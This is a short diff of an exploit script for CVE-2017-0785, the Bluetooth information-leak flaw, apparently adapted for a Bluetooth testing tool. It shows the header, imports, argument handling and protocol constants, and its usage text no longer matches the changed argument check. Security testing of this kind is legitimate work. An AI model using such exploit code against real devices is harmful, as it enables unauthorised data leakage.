@@ -1,18 +1,16 @@
-'''
-Modified CVE-2017-0785.py
-to work with BTAT and return values for logging
+# Modified CVE-2017-0785.py released by Armis
+# to work with BTAT and return values for logging
 
-by @brentru, @daustin1, @epires3
-'''
+#by @brentru, @daustin1, @epires3
 
 from pwn import *
 import bluetooth
 
-if not 'TARGET' in args:
+if not '-t' in args:
     log.info("Usage: CVE-2017-0785.py TARGET=XX:XX:XX:XX:XX:XX")
     exit()
 
-target = args['TARGET']
+target = args['-t']
 service_long = 0x0100
 service_short = 0x0001
 mtu = 50
